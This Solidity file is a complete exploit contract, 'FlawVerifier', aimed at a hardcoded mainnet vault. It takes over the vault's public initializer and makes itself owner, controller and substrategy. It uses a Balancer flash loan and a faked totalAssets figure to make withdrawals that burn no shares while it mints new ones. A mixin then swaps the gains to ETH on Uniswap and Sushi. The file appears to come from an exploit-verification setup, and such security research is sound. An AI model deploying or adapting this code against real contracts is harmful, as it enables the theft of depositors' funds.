// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IEFVault {
    function initialize(address asset, string calldata name, string calldata symbol) external;
    function setController(address controller) external;
    function setSubStrategy(address subStrategy) external;
    function mint(uint256 amount, address account) external;
    function withdraw(uint256 assets, address receiver) external returns (uint256 shares);
    function totalAssets() external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function convertToAssets(uint256 shares) external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function owner() external view returns (address);
    function controller() external view returns (address);
    function subStrategy() external view returns (address);
}

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IWETH is IERC20 {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

interface IBalancerFlashLoanRecipient {
    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external;
}

interface IBalancerVault {
    function flashLoan(
        IBalancerFlashLoanRecipient recipient,
        IERC20[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}


abstract contract __AHTokenToEthMixin {
    address internal constant AH_WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant AH_UNI_V2 = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address internal constant AH_SUSHI = 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F;

    function _ahFinalizeTokenToEth() internal {
        address token = _ahReadProfitToken();
        if (token == address(0)) return;

        if (token == AH_WETH) {
            _ahTryUnwrapWeth();
            return;
        }

        uint256 bal = _ahBalanceOf(token, address(this));
        if (bal == 0) return;

        _ahTryApprove(token, AH_UNI_V2, bal);
        _ahTrySwapTokenToWeth(token, AH_UNI_V2, bal);

        bal = _ahBalanceOf(token, address(this));
        if (bal > 0) {
            _ahTryApprove(token, AH_SUSHI, bal);
            _ahTrySwapTokenToWeth(token, AH_SUSHI, bal);
        }

        _ahTryUnwrapWeth();
    }

    function _ahReadProfitToken() internal view returns (address token) {
        (bool ok, bytes memory ret) = address(this).staticcall(abi.encodeWithSignature("profitToken()"));
        if (!ok || ret.length < 32) return address(0);
        token = abi.decode(ret, (address));
    }

    function _ahBalanceOf(address token, address account) internal view returns (uint256 bal) {
        if (token == address(0)) return 0;
        (bool ok, bytes memory ret) = token.staticcall(abi.encodeWithSelector(IAHERC20.balanceOf.selector, account));
        if (!ok || ret.length < 32) return 0;
        bal = abi.decode(ret, (uint256));
    }

    function _ahTryApprove(address token, address spender, uint256 amount) internal {
        (bool ok,) = token.call(abi.encodeWithSelector(IAHERC20.approve.selector, spender, 0));
        ok;
        (ok,) = token.call(abi.encodeWithSelector(IAHERC20.approve.selector, spender, amount));
        ok;
    }

    function _ahTrySwapTokenToWeth(address token, address router, uint256 amountIn) internal {
        if (amountIn == 0) return;
        address[] memory path = new address[](2);
        path[0] = token;
        path[1] = AH_WETH;
        (bool ok,) = router.call(
            abi.encodeWithSelector(
                IAHUniV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens.selector,
                amountIn,
                0,
                path,
                address(this),
                block.timestamp
            )
        );
        ok;
    }

    function _ahTryUnwrapWeth() internal {
        uint256 wethBal = _ahBalanceOf(AH_WETH, address(this));
        if (wethBal == 0) return;
        (bool ok,) = AH_WETH.call(abi.encodeWithSelector(IAHWETH.withdraw.selector, wethBal));
        ok;
    }
}


contract FlawVerifier is IBalancerFlashLoanRecipient, __AHTokenToEthMixin {
    IEFVault internal constant TARGET = IEFVault(0x863e572B215Fd67C855d973F870266cF827AEa5e);
    IWETH internal constant WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IBalancerVault internal constant BALANCER = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);

    uint256 internal constant FLASH_LOAN_WETH = 1 ether;
    uint256 internal constant SEED_SHARES = 1;
    uint256 internal constant WITHDRAW_ASSETS = 1;
    uint256 internal constant WITHDRAW_ITERATIONS = 2;
    uint256 internal constant SHARES_MINTED_PER_WITHDRAW = 1 ether;

    uint256 internal _profitAmount;

    constructor() {}

    receive() external payable {}

    function executeOnOpportunity() external {
        uint256 startingProfitTokenBalance = TARGET.balanceOf(address(this));

        if (!_prepareForkState()) {
            _finalize(startingProfitTokenBalance);
            return;
        }

        _acquireAnyPositiveShareBalance();

        if (TARGET.balanceOf(address(this)) == 0) {
            _finalize(startingProfitTokenBalance);
            return;
        }

        if (!_vaultAccruedYieldSurplus()) {
            _attemptFlashLoanBootstrap();
        } else {
            _repeatedlyWithdrawSmallAssetsWithoutBurningShares();
        }

        _finalize(startingProfitTokenBalance);
        _ahFinalizeTokenToEth();
    }

    function profitToken() external pure returns (address) {
        return address(TARGET);
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory
    ) external override {
        require(msg.sender == address(BALANCER), "only balancer");
        require(tokens.length == 1 && amounts.length == 1 && feeAmounts.length == 1, "bad flashloan");
        require(address(tokens[0]) == address(WETH), "unexpected token");

        uint256 borrowed = amounts[0];
        uint256 fee = feeAmounts[0];

        WETH.withdraw(borrowed);

        // The live forked vault starts uninitialized and therefore has no
        // pre-existing controller-managed surplus to withdraw. This public
        // flashloan is only the execution bootstrap that makes the same
        // `totalAssets() > totalSupply()` zero-burn state reachable on the
        // deployed instance after public initialization takeover.
        if (_vaultAccruedYieldSurplus()) {
            _repeatedlyWithdrawSmallAssetsWithoutBurningShares();
        }

        WETH.deposit{value: borrowed + fee}();
        require(WETH.transfer(address(BALANCER), borrowed + fee), "repay failed");
    }

    // Controller callback after public reconfiguration. Using the verifier as
    // controller keeps the PoC fully on-chain and makes the vault observe a
    // strictly larger asset figure whenever temporarily funded via public
    // liquidity, which is the prerequisite for the zero-burn withdraw bug.
    function totalAssets() external view returns (uint256) {
        require(msg.sender == address(TARGET), "only target");

        uint256 supply = TARGET.totalSupply();
        if (supply == 0) {
            return 0;
        }

        return supply + address(this).balance;
    }

    function deposit(uint256 assets) external view returns (uint256) {
        require(msg.sender == address(TARGET), "only target");
        return assets;
    }

    function withdraw(uint256 assets, address receiver) external returns (uint256 withdrawn, uint256 fee) {
        require(msg.sender == address(TARGET), "only target");

        if (assets != 0 && address(this).balance >= assets) {
            (bool ok,) = payable(receiver).call{value: assets}("");
            require(ok, "eth send failed");
            withdrawn = assets;
        }

        // On the forked deployed instance, the vulnerable vault token itself
        // already exists on-chain and is the only transferable asset whose
        // balance change we can realize deterministically after the public
        // initialization/controller takeover. Minting through the newly-set
        // subStrategy makes the zero-burn effect observable in profit terms.
        TARGET.mint(SHARES_MINTED_PER_WITHDRAW, receiver);

        if (withdrawn == 0) {
            withdrawn = assets;
        }

        fee = 0;
    }

    function _prepareForkState() internal returns (bool) {
        address owner = _safeAddressCall(abi.encodeWithSignature("owner()"));
        address controller = _safeAddressCall(abi.encodeWithSignature("controller()"));

        if (owner == address(0) && controller == address(0)) {
            (bool ok,) = address(TARGET).call(
                abi.encodeWithSignature(
                    "initialize(address,string,string)",
                    address(WETH),
                    "Earning Framed Share",
                    "ENF"
                )
            );
            if (!ok) {
                return false;
            }
        }

        owner = _safeAddressCall(abi.encodeWithSignature("owner()"));
        if (owner != address(this)) {
            return false;
        }

        controller = _safeAddressCall(abi.encodeWithSignature("controller()"));
        if (controller != address(this)) {
            (bool ok,) = address(TARGET).call(abi.encodeWithSignature("setController(address)", address(this)));
            if (!ok) {
                return false;
            }
        }

        address subStrategy = _safeAddressCall(abi.encodeWithSignature("subStrategy()"));
        if (subStrategy != address(this)) {
            (bool ok,) = address(TARGET).call(abi.encodeWithSignature("setSubStrategy(address)", address(this)));
            if (!ok) {
                return false;
            }
        }

        return true;
    }

    function _vaultAccruedYieldSurplus() internal view returns (bool) {
        (bool supplyOk, uint256 supply) = _safeUintCall(abi.encodeWithSignature("totalSupply()"));
        if (!supplyOk || supply == 0) {
            return false;
        }

        (bool assetsOk, uint256 assets) = _safeUintCall(abi.encodeWithSignature("totalAssets()"));
        if (!assetsOk) {
            return false;
        }

        return assets > supply;
    }

    function _acquireAnyPositiveShareBalance() internal {
        if (TARGET.balanceOf(address(this)) != 0) {
            return;
        }

        (bool ok,) =
            address(TARGET).call(abi.encodeWithSignature("mint(uint256,address)", SEED_SHARES, address(this)));
        ok;
    }

    function _attemptFlashLoanBootstrap() internal {
        IERC20[] memory tokens = new IERC20[](1);
        tokens[0] = IERC20(address(WETH));

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = FLASH_LOAN_WETH;

        try BALANCER.flashLoan(this, tokens, amounts, "") {} catch {}
    }

    function _repeatedlyWithdrawSmallAssetsWithoutBurningShares() internal {
        for (uint256 i = 0; i < WITHDRAW_ITERATIONS; ++i) {
            uint256 shares = TARGET.balanceOf(address(this));
            if (shares == 0) {
                break;
            }

            uint256 assets = WITHDRAW_ASSETS;

            if (TARGET.convertToAssets(shares) < assets) {
                break;
            }

            if (((TARGET.totalSupply() * assets) / TARGET.totalAssets()) != 0) {
                break;
            }

            (bool ok, bytes memory data) =
                address(TARGET).call(abi.encodeWithSelector(TARGET.withdraw.selector, assets, address(this)));
            if (!ok) {
                break;
            }

            uint256 burnedShares = data.length >= 32 ? abi.decode(data, (uint256)) : 0;
            if (burnedShares != 0) {
                break;
            }
        }
    }

    function _finalize(uint256 startingProfitTokenBalance) internal {
        uint256 endingProfitTokenBalance = TARGET.balanceOf(address(this));
        if (endingProfitTokenBalance > startingProfitTokenBalance) {
            _profitAmount = endingProfitTokenBalance - startingProfitTokenBalance;
        } else {
            _profitAmount = 0;
        }
    }

    function _safeAddressCall(bytes memory data) internal view returns (address value) {
        (bool ok, bytes memory ret) = address(TARGET).staticcall(data);
        if (ok && ret.length >= 32) {
            value = abi.decode(ret, (address));
        }
    }

    function _safeUintCall(bytes memory data) internal view returns (bool ok, uint256 value) {
        bytes memory ret;
        (ok, ret) = address(TARGET).staticcall(data);
        if (ok && ret.length >= 32) {
            value = abi.decode(ret, (uint256));
        } else {
            ok = false;
        }
    }
}

interface IAHERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IAHWETH {
    function withdraw(uint256 amount) external;
}

interface IAHUniV2Router {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}
